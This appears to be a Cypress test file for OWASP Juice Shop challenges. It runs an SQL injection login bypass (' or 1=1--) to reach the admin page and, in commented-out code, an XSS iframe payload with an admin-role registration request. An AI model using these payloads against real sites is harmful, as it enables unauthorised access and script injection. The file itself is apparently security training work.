// describe('Test API', () => {
//     it('POST', () => {
//         // cy.getCookie('token').then((token) => {
//         cy.request({
//             url: 'https://juice-shop.eliitme.xyz/#/register',
//             method: 'POST',
//             cache: 'no-cache',
//             headers: {
//                 'Content-type': 'application/json'
//             },
//             body: JSON.stringify({
//                 email: '<iframe src="javascript:alert(`xss`)">',
//                 password: 'XSSed',
//                 passwordRepeat: 'XSSed',
//                 role: 'admin'
//             })
//         }).then((res) => {
//             expect(res.status).to.eq(200);
//         })
//     })
// })

// import { printf } from "extsprintf";
// import loginPage from "../PageObjects/loginPage";
// const loginpage = new loginPage()

// describe('GET', () => {
//     it('POST', () => {
//         // cy.getCookie('token').then((token) => {
//         cy.request({
//             url: 'https://juice-shop.eliitme.xyz/rest/user/login',
//             method: 'POST',
//             headers: { accept: 'application/json, text/plain, */*' },
//             body: {
//                 email: "' or 1=1--",
//                 password: "a"
//             }
//         })
//         if (Response.status === 200) {
//             console.log('thanh cong')
//         }
//     })

// })
import { printf } from "extsprintf";
import loginPage from "../PageObjects/loginPage";
const loginpage = new loginPage()

describe('challenge login with Role', () => {
    beforeEach(() => {
        cy.visit('/login');
        loginpage.setClickCancel();

        loginpage.setEmail("' or 1=1--");

        loginpage.setPassword("1234567");

        loginpage.clickSubmit();

        cy.wait(1000)

    })
    it('should log in Admin with role User', () => {
        cy.visit('/administration');

        cy.get('.mat-cell.mat-column-remove > button').should('be.visible');
    })

})
describe('challenge login with Role', () => {
    beforeEach(() => {
        cy.visit('/login');
        loginpage.setClickCancel();

        loginpage.setEmail("long17@yopmail.com");

        loginpage.setPassword("1234567");

        loginpage.clickSubmit();

        cy.wait(1000)

    })
    it('should log in Admin with role User', () => {
        cy.visit('/administration');

        cy.get('.mat-cell.mat-column-remove > button').should('be.visible');
    })

})